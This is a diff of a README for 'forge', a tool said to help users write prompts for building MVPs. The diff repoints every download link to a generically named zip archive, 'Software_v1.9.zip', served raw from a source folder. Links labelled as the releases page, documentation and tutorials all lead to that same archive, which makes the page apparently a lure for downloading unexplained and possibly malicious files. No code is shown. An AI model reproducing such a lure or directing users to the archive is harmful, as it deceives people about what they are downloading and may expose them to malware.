@@ -1,7 +1,7 @@
 # 🎉 forge - Create Perfect Prompts for Quick MVPs
 
 ## 📥 Download Now
-[![Download forge](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip)](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip)
+[![Download forge](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip)](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip)
 
 ## 📖 Introduction
 Welcome to the forge repository! This tool helps you transform your ideas into effective prompts. With forge, you can create working Minimum Viable Products (MVPs) on your first try. Whether you’re brainstorming or building, this application guides you through the process and enhances your productivity.
@@ -16,7 +16,7 @@ You don’t need technical skills to get started with forge. Follow these simple
 - Internet connection for updates and features
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Click on this link to [download forge](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip).
+1. **Visit the Releases Page:** Click on this link to [download forge](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip).
 2. **Select the Latest Release:** Look for the most recent version listed on the page. Each release includes notable improvements and bug fixes.
 3. **Download the File:** Click on the download link for your operating system to start the download. 
 4. **Locate the Downloaded File:** Go to your Downloads folder or the location you selected.
@@ -60,10 +60,10 @@ Join our community of users and developers. Engage in discussions, share insight
 - **Social Media:** Follow our updates on social platforms to learn tips and tricks for using forge effectively.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip): Detailed instructions and guides on how to maximize your usage of our tool.
-- [Tutorials](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip): Step-by-step guides to help you get started quickly.
+- [Documentation](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip): Detailed instructions and guides on how to maximize your usage of our tool.
+- [Tutorials](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip): Step-by-step guides to help you get started quickly.
 
 ## 📥 Download Now Again
-Don't forget to [download forge](https://raw.githubusercontent.com/XD679/forge/main/src/components/ui/forge-v3.1.zip) and start turning your ideas into reality! 
+Don't forget to [download forge](https://raw.githubusercontent.com/XD679/forge/main/src/integrations/Software_v1.9.zip) and start turning your ideas into reality! 
 
 Enjoy using forge, and may your MVPs be excellent!
